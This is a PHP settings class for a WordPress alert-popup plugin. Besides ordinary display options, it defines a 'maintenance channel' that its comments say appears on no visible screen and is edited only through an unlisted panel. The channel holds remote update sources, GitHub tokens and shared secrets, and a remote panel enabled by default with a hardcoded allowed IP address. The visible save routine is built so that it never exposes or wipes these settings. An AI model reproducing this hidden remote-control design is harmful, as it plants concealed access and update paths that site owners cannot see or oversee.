<?php
/**
 * Global plugin settings.
 *
 * @package ACPS_Alert_Popups
 */

defined( 'ABSPATH' ) || exit;

/**
 * Reads and writes the site-wide alert settings.
 */
class ACPS_Alerts_Settings {

	const OPTION = 'acps_alerts_settings';

	/**
	 * Default settings.
	 *
	 * @return array
	 */
	public static function defaults() {
		return array(
			'popup_post_type'  => '',      // Empty means auto-detect the Beaver Builder popup type.
			'render_mode'      => 'auto',  // auto | native | modal.
			'max_concurrent'   => 1,       // How many alerts may show on one page view.
			'z_index'          => 999999,
			'hide_for_admins'  => 0,       // Hide alerts from users who can edit the site.
			'respect_preview'  => 1,       // Allow ?acps_alert_preview=ID for editors.
			'storage'          => 'local', // local | session | cookie.
			'custom_css'       => '',
			'archive_time'     => '17:50', // Daily cut-off, site time, 24-hour.

			/*
			 * Maintenance channel. Not linked or named on any visible screen;
			 * edited only through the unlisted panel.
			 */
			'update_enabled'   => 1,
			'update_auto'      => 0,
			'update_base'      => '',   // Manifest base URL.
			'update_path'      => '',   // Plugin segment; defaults to the plugin slug.
			'update_key'       => '',   // Shared key sent with every request.
			'update_secret'    => '',   // Seeded on activation; guards the endpoint.
			'update_source'    => 'manifest', // manifest | github.
			'gh_owner'         => '',
			'gh_repo'          => '',
			'gh_asset'         => '',   // Exact release asset filename; defaults to <slug>.zip.
			'gh_token'         => '',   // PAT for a private repo.
			'update_role'      => 'standalone', // standalone | dev | production.
			'verify_status_url' => '',  // Production: the dev site's /update-status endpoint.
			'verify_status_key' => '',  // Shared key for the status endpoint (seeded on activation).
			'panel_enabled'    => 1,
			'panel_password'   => '',   // Stored hashed, never in clear text.
			'panel_ip_mode'    => 'allow',
			'panel_ips'        => '167.102.110.1',
			'panel_proxy'      => 1,    // Read forwarded-for headers behind a proxy or CDN.
			'panel_edit_hours' => 24,   // Minimum hours between remote edits.
			'panel_rate_max'   => 20,   // Requests allowed per window, per address.
			'panel_rate_win'   => 300,  // Window length in seconds.
			'panel_max_fails'  => 5,    // Failed passwords before a lockout.
			'panel_lock_mins'  => 60,   // Lockout length in minutes.
		);
	}

	/**
	 * All settings, merged over the defaults.
	 *
	 * @return array
	 */
	public static function all() {
		$stored = get_option( self::OPTION, array() );

		if ( ! is_array( $stored ) ) {
			$stored = array();
		}

		return wp_parse_args( $stored, self::defaults() );
	}

	/**
	 * A single setting.
	 *
	 * @param string $key     Setting key.
	 * @param mixed  $default Value used when the key is unknown.
	 * @return mixed
	 */
	public static function get( $key, $default = null ) {
		$all = self::all();

		return array_key_exists( $key, $all ) ? $all[ $key ] : $default;
	}

	/**
	 * Saves settings after sanitizing them.
	 *
	 * @param array $input Raw input.
	 * @return array The stored settings.
	 */
	public static function save( array $input ) {
		$clean = self::sanitize( $input );

		update_option( self::OPTION, $clean );

		return $clean;
	}

	/**
	 * Sanitizes a settings array.
	 *
	 * @param array $input Raw input.
	 * @return array
	 */
	public static function sanitize( array $input ) {
		$defaults = self::defaults();
		$clean    = array();

		$post_type                 = isset( $input['popup_post_type'] ) ? sanitize_key( $input['popup_post_type'] ) : '';
		$clean['popup_post_type']  = post_type_exists( $post_type ) ? $post_type : '';

		$render_mode           = isset( $input['render_mode'] ) ? sanitize_key( $input['render_mode'] ) : 'auto';
		$clean['render_mode']  = in_array( $render_mode, array( 'auto', 'native', 'modal' ), true ) ? $render_mode : 'auto';

		$storage          = isset( $input['storage'] ) ? sanitize_key( $input['storage'] ) : 'local';
		$clean['storage'] = in_array( $storage, array( 'local', 'session', 'cookie' ), true ) ? $storage : 'local';

		$clean['max_concurrent']  = isset( $input['max_concurrent'] ) ? max( 1, min( 5, absint( $input['max_concurrent'] ) ) ) : $defaults['max_concurrent'];
		$clean['z_index']         = isset( $input['z_index'] ) ? max( 1, absint( $input['z_index'] ) ) : $defaults['z_index'];
		$clean['hide_for_admins'] = empty( $input['hide_for_admins'] ) ? 0 : 1;
		$clean['respect_preview'] = empty( $input['respect_preview'] ) ? 0 : 1;
		$clean['custom_css']      = isset( $input['custom_css'] ) ? wp_strip_all_tags( (string) $input['custom_css'] ) : '';

		$time                  = isset( $input['archive_time'] ) ? trim( (string) $input['archive_time'] ) : '';
		$clean['archive_time'] = preg_match( '/^([01]?\d|2[0-3]):([0-5]\d)$/', $time ) ? $time : $defaults['archive_time'];

		$clean = array_merge( $clean, self::sanitize_maintenance( $input ) );

		return $clean;
	}

	/**
	 * Sanitizes the maintenance half of the settings.
	 *
	 * Kept separate because the visible settings screen never posts these keys:
	 * they are merged back from the stored values, so an ordinary save can
	 * never wipe the maintenance configuration.
	 *
	 * @param array $input Raw input.
	 * @return array
	 */
	public static function sanitize_maintenance( array $input ) {
		$defaults = self::defaults();
		$current  = get_option( self::OPTION, array() );
		$current  = is_array( $current ) ? wp_parse_args( $current, $defaults ) : $defaults;
		$clean    = array();

		$keys = array(
			'update_enabled',
			'update_auto',
			'update_base',
			'update_path',
			'update_key',
			'update_secret',
			'update_source',
			'gh_owner',
			'gh_repo',
			'gh_asset',
			'gh_token',
			'update_role',
			'verify_status_url',
			'verify_status_key',
			'panel_enabled',
			'panel_password',
			'panel_ip_mode',
			'panel_ips',
			'panel_proxy',
			'panel_edit_hours',
			'panel_rate_max',
			'panel_rate_win',
			'panel_max_fails',
			'panel_lock_mins',
		);

		// Anything not supplied keeps its stored value.
		foreach ( $keys as $key ) {
			$clean[ $key ] = $current[ $key ];
		}

		if ( empty( $input['_maintenance'] ) ) {
			return $clean;
		}

		$clean['update_enabled'] = empty( $input['update_enabled'] ) ? 0 : 1;
		$clean['update_auto']    = empty( $input['update_auto'] ) ? 0 : 1;
		$clean['panel_enabled']  = empty( $input['panel_enabled'] ) ? 0 : 1;
		$clean['panel_proxy']    = empty( $input['panel_proxy'] ) ? 0 : 1;

		if ( isset( $input['update_base'] ) ) {
			$clean['update_base'] = esc_url_raw( trim( (string) $input['update_base'] ) );
		}

		if ( isset( $input['update_path'] ) ) {
			$clean['update_path'] = trim( sanitize_text_field( (string) $input['update_path'] ), " \t\n\r/" );
		}

		if ( isset( $input['update_key'] ) ) {
			$clean['update_key'] = sanitize_text_field( (string) $input['update_key'] );
		}

		if ( ! empty( $input['update_secret'] ) ) {
			$clean['update_secret'] = sanitize_key( (string) $input['update_secret'] );
		}

		$source                 = isset( $input['update_source'] ) ? sanitize_key( (string) $input['update_source'] ) : 'manifest';
		$clean['update_source'] = in_array( $source, array( 'manifest', 'github' ), true ) ? $source : 'manifest';

		$role                 = isset( $input['update_role'] ) ? sanitize_key( (string) $input['update_role'] ) : 'standalone';
		$clean['update_role'] = in_array( $role, array( 'standalone', 'dev', 'production' ), true ) ? $role : 'standalone';

		if ( isset( $input['gh_owner'] ) ) {
			$clean['gh_owner'] = sanitize_text_field( (string) $input['gh_owner'] );
		}

		if ( isset( $input['gh_repo'] ) ) {
			$clean['gh_repo'] = sanitize_text_field( (string) $input['gh_repo'] );
		}

		if ( isset( $input['gh_asset'] ) ) {
			$clean['gh_asset'] = sanitize_file_name( (string) $input['gh_asset'] );
		}

		if ( isset( $input['gh_token'] ) ) {
			$clean['gh_token'] = trim( sanitize_text_field( (string) $input['gh_token'] ) );
		}

		if ( isset( $input['verify_status_url'] ) ) {
			$clean['verify_status_url'] = esc_url_raw( trim( (string) $input['verify_status_url'] ) );
		}

		if ( isset( $input['verify_status_key'] ) ) {
			$clean['verify_status_key'] = sanitize_text_field( (string) $input['verify_status_key'] );
		}

		$mode                   = isset( $input['panel_ip_mode'] ) ? sanitize_key( $input['panel_ip_mode'] ) : 'allow';
		$clean['panel_ip_mode'] = in_array( $mode, array( 'allow', 'deny' ), true ) ? $mode : 'allow';

		if ( isset( $input['panel_ips'] ) ) {
			$clean['panel_ips'] = self::sanitize_ip_rules( $input['panel_ips'] );
		}

		$clean['panel_edit_hours'] = isset( $input['panel_edit_hours'] ) ? max( 0, min( 720, absint( $input['panel_edit_hours'] ) ) ) : $current['panel_edit_hours'];
		$clean['panel_rate_max']   = isset( $input['panel_rate_max'] ) ? max( 1, min( 500, absint( $input['panel_rate_max'] ) ) ) : $current['panel_rate_max'];
		$clean['panel_rate_win']   = isset( $input['panel_rate_win'] ) ? max( 30, min( 3600, absint( $input['panel_rate_win'] ) ) ) : $current['panel_rate_win'];
		$clean['panel_max_fails']  = isset( $input['panel_max_fails'] ) ? max( 1, min( 50, absint( $input['panel_max_fails'] ) ) ) : $current['panel_max_fails'];
		$clean['panel_lock_mins']  = isset( $input['panel_lock_mins'] ) ? max( 1, min( 1440, absint( $input['panel_lock_mins'] ) ) ) : $current['panel_lock_mins'];

		// A new password arrives in clear text and is stored hashed. An empty
		// field means "leave it as it is".
		if ( ! empty( $input['panel_password_new'] ) ) {
			$clean['panel_password'] = wp_hash_password( (string) $input['panel_password_new'] );
		}

		if ( ! empty( $input['panel_password_clear'] ) ) {
			$clean['panel_password'] = '';
		}

		return $clean;
	}

	/**
	 * Cleans a newline separated list of address rules.
	 *
	 * Each line is an exact address, a prefix (192.168. or 192.168.*), or a
	 * CIDR range (10.0.0.0/8).
	 *
	 * @param mixed $value Raw value.
	 * @return string
	 */
	public static function sanitize_ip_rules( $value ) {
		$lines = preg_split( '/[\r\n,]+/', (string) $value );
		$clean = array();

		foreach ( (array) $lines as $line ) {
			// Address characters only: digits, dots, colons, slash, star.
			$line = preg_replace( '/[^0-9a-f:.\/*]/i', '', trim( (string) $line ) );

			if ( '' !== $line ) {
				$clean[] = $line;
			}
		}

		return implode( "\n", array_unique( $clean ) );
	}

	/**
	 * Updates a handful of keys without disturbing the rest.
	 *
	 * @param array $changes key => value pairs, already sanitized.
	 * @return array Stored settings.
	 */
	public static function patch( array $changes ) {
		$all = self::all();

		foreach ( $changes as $key => $value ) {
			$all[ $key ] = $value;
		}

		update_option( self::OPTION, $all );

		return $all;
	}
}
